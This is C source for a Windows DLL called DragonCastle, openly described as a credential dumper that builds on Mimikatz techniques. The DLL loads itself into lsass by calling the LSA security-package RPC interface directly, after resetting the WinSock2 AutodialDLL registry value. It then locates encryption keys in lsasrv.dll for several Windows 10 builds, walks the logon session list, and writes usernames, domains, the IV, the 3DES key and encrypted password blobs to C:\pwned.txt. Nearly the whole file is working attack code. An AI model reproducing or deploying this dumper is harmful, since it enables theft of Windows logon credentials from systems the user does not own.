/*
# DragonCastle - A credential dumper
# Author: Juan Manuel Fernandez (@TheXC3LL)
# Based on:
# https://decoded.avast.io/luigicamastra/operation-dragon-castling-apt-group-targeting-betting-companies/
# https://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/
# https://adepts.of0x.cc/physical-graffiti-lsass/
# https://blog.xpnsec.com/exploring-mimikatz-part-2/
# https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
*/

#define SECURITY_WIN32
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <iostream>
#include <subauth.h>
#include <sspi.h>
#include <Dbghelp.h>
#include "sspi_h.h"
#include <stdio.h>
#include <psapi.h>


#pragma warning(disable:4996)

HMODULE ourself = NULL;

typedef struct _KIWI_HARD_KEY {
    ULONG cbSecret;
    BYTE data[60]; // etc...
} KIWI_HARD_KEY, * PKIWI_HARD_KEY;

typedef struct _KIWI_BCRYPT_KEY81 {
    ULONG size;
    ULONG tag;	// 'MSSK'
    ULONG type;
    ULONG unk0;
    ULONG unk1;
    ULONG unk2;
    ULONG unk3;
    ULONG unk4;
    PVOID unk5;	// before, align in x64
    ULONG unk6;
    ULONG unk7;
    ULONG unk8;
    ULONG unk9;
    KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, * PKIWI_BCRYPT_KEY81;

typedef struct _KIWI_BCRYPT_HANDLE_KEY {
    ULONG size;
    ULONG tag;	// 'UUUR'
    PVOID hAlgorithm;
    PKIWI_BCRYPT_KEY81 key;
    PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, * PKIWI_BCRYPT_HANDLE_KEY;

DWORD buildNumber(void) {
    char build[16] = { 0 };
    DWORD size = 16;
    HKEY hKey;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegGetValueA(hKey, NULL, "CurrentBuildNumber", RRF_RT_ANY, NULL, (PVOID)&build, &size);
        RegCloseKey(hKey);
        DWORD buildnumber = atoi(build);
        return buildnumber;
    }
    return -1;
}

// From https://gist.github.com/xpn/93f2b75bf086baf2c388b2ddd50fb5d0
DWORD SearchPattern(unsigned char* mem, unsigned char* signature, DWORD signatureLen, DWORD memSize) {
    ULONG offseti = 0;

    for (DWORD i = 0; i < memSize; i++) {
        if (*(unsigned char*)(mem + i) == signature[0] && *(unsigned char*)(mem + i + 1) == signature[1]) {
            if (memcmp(mem + i, signature, signatureLen) == 0) {
                // Found the signature
                offseti = i;
                break;
            }
        }
    }
    return offseti;
}

void addSSP(void) {
    RPC_STATUS status;
    UNICODE_STRING packageName;
    UWORD packetLen = 0;
    unsigned char* pszStringBinding = NULL;
    unsigned long ulCode;
    unsigned long long unk1;
    unsigned char rpcPacket[0x2000];
    long out1 = 0, out2 = 0;
    void* out3 = (void*)0;
    struct Struct_144_t out4;

    char* dllname = (char*)malloc(MAX_PATH);
    GetModuleFileNameA(ourself, dllname, MAX_PATH);
    // Init RPC packet
    memset(&packageName, 0, sizeof(packageName));
    memset(rpcPacket, 0, sizeof(rpcPacket));

    // Build DLL to be loaded by lsass
    packageName.Length = strlen(dllname) * 2;
    packageName.MaximumLength = (strlen(dllname) * 2) + 2;
    mbstowcs((wchar_t*)(rpcPacket + 0xd8), dllname, (sizeof(rpcPacket) - 0xd8) / 2);
    packetLen = 0xd8 + packageName.MaximumLength;

    // Complete RPC packet fields
    *(unsigned long long*)rpcPacket = 0xc4; // ??
    *(unsigned short*)(rpcPacket + 2) = packetLen; // Length of packet
    *(unsigned long long*)((char*)rpcPacket + 8) = GetCurrentProcessId();  // Process ID
    *(unsigned long long*)((char*)rpcPacket + 16) = GetCurrentThreadId();  //Thread ID
    *(unsigned long long*)((char*)rpcPacket + 0x28) = 0x0b;  // RPC call ID
    *(void**)((char*)rpcPacket + 0xd0) = &unk1; // ??

    // Copy package name into RPC packet
    memcpy(rpcPacket + 0x40, &packageName, 8);
    *(unsigned long long*)((char*)rpcPacket + 0x48) = 0xd8;  // Offset to unicode ssp name

    // Create the RPC connection string
    status = RpcStringBindingComposeA(NULL,
        (unsigned char*)"ncalrpc",
        NULL,
        (unsigned char*)"lsasspirpc",
        NULL,
        &pszStringBinding);
    if (status) {
        return;
    }

    // Create RPC handle
    status = RpcBindingFromStringBindingA(pszStringBinding, &default_IfHandle);
    if (status) {
        return;
    }

    memset(&out4, 0, sizeof(out4));

    RpcTryExcept
    {
        // Create our RPC context handle
        long ret = Proc0_SspirConnectRpc((unsigned char*)NULL, 2, &out1, &out2, &out3);

        // Make the "AddSecurityPackage" call directly via RPC
        ret = Proc3_SspirCallRpc(out3, packetLen, rpcPacket, &out2, (unsigned char**)&out3, &out4);
    }
        RpcExcept(1)
    {
        ulCode = RpcExceptionCode();
    }
    RpcEndExcept
 return;
}

void getHashes(void) {
    unsigned char* moduleBase;
    DWORD offset;
    DWORD offsetLogonSessionList_needle;
    DWORD offsetLUIDs;
    DWORD offsetUsername;
    DWORD offsetDomain;
    DWORD offsetPassword;
    unsigned char* iv_vector;
    unsigned char* DES_key = NULL;
    DWORD offsetCrypt;
    DWORD offsetIV;
    DWORD offsetKey;
    ULONGLONG iv_offset = 0;
    ULONGLONG hDes_offset = 0;
    ULONGLONG DES_pointer = 0;
    ULONGLONG LogonSessionList_offset = 0;
    unsigned char* currentElem = NULL;
    unsigned char* LogonSessionList;
    KIWI_BCRYPT_HANDLE_KEY h3DesKey;
    KIWI_BCRYPT_KEY81 extracted3DesKey;

    moduleBase = (unsigned char*)GetModuleHandleA("lsasrv.dll");

    switch (buildNumber()) {
    case 14393: { // Windows 10 v1607 && Windows Server 2016
        BYTE LsaInitialize_needle[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
        offsetCrypt = SearchPattern(moduleBase, LsaInitialize_needle, sizeof(LsaInitialize_needle), 0x200000);
        offsetIV = 0x3d;
        offsetKey = 0x49;
        BYTE LogonSessionList_needle[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
        offsetLogonSessionList_needle = SearchPattern(moduleBase, LogonSessionList_needle, sizeof(LogonSessionList_needle), 0x200000);
        offsetLUIDs = 0x10;
        offsetUsername = 0x90;
        offsetDomain = 0xA0;
        offsetPassword = 0x108;
        break;
    }      
    case 16299: { // Windows 10 v1709 && Windows 10 v1703
        BYTE LsaInitialize_needle[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
        offsetCrypt = SearchPattern(moduleBase, LsaInitialize_needle, sizeof(LsaInitialize_needle), 0x200000);
        offsetIV = 0x3d;
        offsetKey = 0x49;
        BYTE LogonSessionList_needle[] = { 0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
        offsetLogonSessionList_needle = SearchPattern(moduleBase, LogonSessionList_needle, sizeof(LogonSessionList_needle), 0x200000);
        offsetLUIDs = 0x17;
        offsetUsername = 0x90;
        offsetDomain = 0xA0;
        offsetPassword = 0x108;
        break;
    }
    case 17763: { // Windows 10 v1809 && Windows 10 v1803
        BYTE LsaInitialize_needle[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };      
        offsetCrypt = SearchPattern(moduleBase, LsaInitialize_needle, sizeof(LsaInitialize_needle), 0x200000);
        offsetIV = 0x43;
        offsetKey = 0x59;
        BYTE LogonSessionList_needle[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
        offsetLogonSessionList_needle = SearchPattern(moduleBase, LogonSessionList_needle, sizeof(LogonSessionList_needle), 0x200000);
        offsetLUIDs = 0x17;
        offsetUsername = 0x90;
        offsetDomain = 0xA0;
        offsetPassword = 0x108;
        break;
    }

    case 18363: { // Windows 10 v1909 && Windows 10 v1903
        BYTE LsaInitialize_needle[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
        offsetCrypt = SearchPattern(moduleBase, LsaInitialize_needle, sizeof(LsaInitialize_needle), 0x200000);
        offsetIV = 0x43;
        offsetKey = 0x59;
        BYTE LogonSessionList_needle[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
        offsetLogonSessionList_needle = SearchPattern(moduleBase, LogonSessionList_needle, sizeof(LogonSessionList_needle), 0x200000);
        offsetLUIDs = 0x17;
        offsetUsername = 0x90;
        offsetDomain = 0xA0;
        offsetPassword = 0x108;
        break;
    }
    case 19041: { // Windows 10 version (2004)
        BYTE LsaInitialize_needle[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
        offsetCrypt = SearchPattern(moduleBase, LsaInitialize_needle, sizeof(LsaInitialize_needle), 0x200000);
        offsetIV = 0x43;
        offsetKey = 0x59;
        BYTE LogonSessionList_needle[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
        offsetLogonSessionList_needle = SearchPattern(moduleBase, LogonSessionList_needle, sizeof(LogonSessionList_needle), 0x200000);
        offsetLUIDs = 0x17;
        offsetUsername = 0x90;
        offsetDomain = 0xA0;
        offsetPassword = 0x108;
        break;
    }
    case 19043: { // Windows 10 version 21H1
        BYTE LsaInitialize_needle[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
        offsetCrypt = SearchPattern(moduleBase, LsaInitialize_needle, sizeof(LsaInitialize_needle), 0x200000);
        offsetIV = 0x43;
        offsetKey = 0x59;
        BYTE LogonSessionList_needle[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
        offsetLogonSessionList_needle = SearchPattern(moduleBase, LogonSessionList_needle, sizeof(LogonSessionList_needle), 0x200000);
        offsetLUIDs = 0x17;
        offsetUsername = 0x90;
        offsetDomain = 0xA0;
        offsetPassword = 0x108;
        break;
    }
    case -1:
    {
        BYTE LogonSessionList_needle[] = { 0 };
        return;
    }
    }
    
    FILE* file;
    if ((file = fopen("C:\\pwned.txt", "ab")) == NULL) {
        return;
    }
    char* loginfo;


    memcpy(&iv_offset, offsetCrypt + moduleBase + offsetIV, 4);
    iv_vector = (unsigned char*)malloc(16);
    memcpy(iv_vector, offsetCrypt + moduleBase + offsetIV + 4 + iv_offset, 16);
    fwrite("IV:", strlen("IV:"), 1, file);
    for (int i = 0; i < 16; i++) {
        loginfo = (char*)malloc(4);
        snprintf(loginfo, 4, "%02x", iv_vector[i]);
        fwrite(loginfo, 2, 1, file);
        free(loginfo);
    }
    free(iv_vector);

    memcpy(&hDes_offset, moduleBase + offsetCrypt - offsetKey, 4);
    memcpy(&DES_pointer, moduleBase + offsetCrypt - offsetKey + 4 + hDes_offset, 8);
    memcpy(&h3DesKey, (void *)DES_pointer, sizeof(KIWI_BCRYPT_HANDLE_KEY));
    memcpy(&extracted3DesKey, h3DesKey.key, sizeof(KIWI_BCRYPT_KEY81));    
    DES_key = (unsigned char*)malloc(extracted3DesKey.hardkey.cbSecret);
    memcpy(DES_key, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
    fwrite("\n3DES: ", strlen("\n3DES:"), 1, file);
    for (int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
        loginfo = (char*)malloc(4);
        snprintf(loginfo, 4, "%02x", DES_key[i]);
        fwrite(loginfo, 2, 1, file);
        free(loginfo);
    }
    free(DES_key);

    memcpy(&LogonSessionList_offset, moduleBase + offsetLogonSessionList_needle + offsetLUIDs, 4);
    LogonSessionList = moduleBase + offsetLogonSessionList_needle + offsetLUIDs + 4 + LogonSessionList_offset;

    while (currentElem != LogonSessionList) {
        if (currentElem == NULL) {
            currentElem = LogonSessionList;
        }
        ULONGLONG tmp = 0;
        USHORT length = 0;
        LPWSTR username = NULL;
        LPWSTR domain = NULL;
        ULONGLONG domain_pointer = 0;
        ULONGLONG username_pointer = 0;

        memcpy(&tmp, currentElem, 8);
        currentElem = (unsigned char*)tmp;

        memcpy(&length, (void*)(tmp + offsetUsername), 2);
        username = (LPWSTR)malloc(length + 2);
        memset(username, 0, length + 2);
        memcpy(&username_pointer, (void*)(tmp + offsetUsername + 0x8), 8);
        memcpy(username, (void*)username_pointer, length);       
        loginfo = (char*)malloc(1024);
        snprintf(loginfo, 1024, "\n----\nUser: %S\n", username);
        fwrite(loginfo, strlen(loginfo), 1, file);
        free(loginfo);
        free(username);


        memcpy(&length, (void*)(tmp + offsetDomain), 2);
        domain = (LPWSTR)malloc(length + 2);
        memset(domain, 0, length + 2);
        memcpy(&domain_pointer, (void*)(tmp + offsetDomain + 0x8), 8);
        memcpy(domain, (void*)domain_pointer, length);
        loginfo = (char*)malloc(1024);
        snprintf(loginfo, 1024, "Domain: %S\n", domain);
        fwrite(loginfo, strlen(loginfo), 1, file);
        free(loginfo);
        free(domain);


        ULONGLONG credentials_pointer = 0;
        memcpy(&credentials_pointer, (void*)(tmp + offsetPassword), 8);
        if (credentials_pointer == 0) {
            continue;
        }
        
        ULONGLONG primaryCredentials_pointer = 0;
        memcpy(&primaryCredentials_pointer, (void*)(credentials_pointer + 0x10), 8);
        USHORT cryptoblob_size = 0;
        memcpy(&cryptoblob_size, (void*)(primaryCredentials_pointer + 0x18), 4);
        if (cryptoblob_size % 8 != 0) {
            loginfo = (char*)malloc(1024);
            snprintf(loginfo, 1024, "\nPasswordErr: NOT COMPATIBLE WITH 3DES, skipping\n");
            fwrite(loginfo, strlen(loginfo), 1, file);
            free(loginfo);
            continue;
        }

        ULONGLONG cryptoblob_pointer = 0;
        memcpy(&cryptoblob_pointer, (void*)(primaryCredentials_pointer + 0x20), 8);
        unsigned char* cryptoblob = (unsigned char*)malloc(cryptoblob_size);
        memcpy(cryptoblob, (void*)cryptoblob_pointer, cryptoblob_size);
        loginfo = (char*)malloc(1024);
        snprintf(loginfo, 1024, "\nPassword:");
        fwrite(loginfo, strlen(loginfo), 1, file);
        free(loginfo);
        for (int i = 0; i < cryptoblob_size; i++) {
            loginfo = (char*)malloc(4);
            snprintf(loginfo, 4, "%02x", cryptoblob[i]);
            fwrite(loginfo, 2, 1, file);
            free(loginfo);
        }
        free(cryptoblob);
        
    }
    fclose(file);
}


void onAttach(void) {

    LPSTR path = (LPSTR)malloc(MAX_PATH);
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (strncmp(path, "C:\\Windows\\system32\\lsass.exe", MAX_PATH) == 0) { getHashes(); }
    else {
        LPCSTR orig = "C:\\windows\\system32\\rasadhlp.dll";
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "AutodialDLL", 0, REG_SZ, (LPBYTE)orig, strlen(orig) + 1);
            RegCloseKey(hKey);
            addSSP();
        }
    }
    free(path);
}


BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        ourself = hinstDLL;
        onAttach();
        break;

    case DLL_THREAD_ATTACH:

        break;

    case DLL_THREAD_DETACH:

        break;

    case DLL_PROCESS_DETACH:
        break;
    }
    return FALSE;
}


void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
    return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
    free(ptr);
}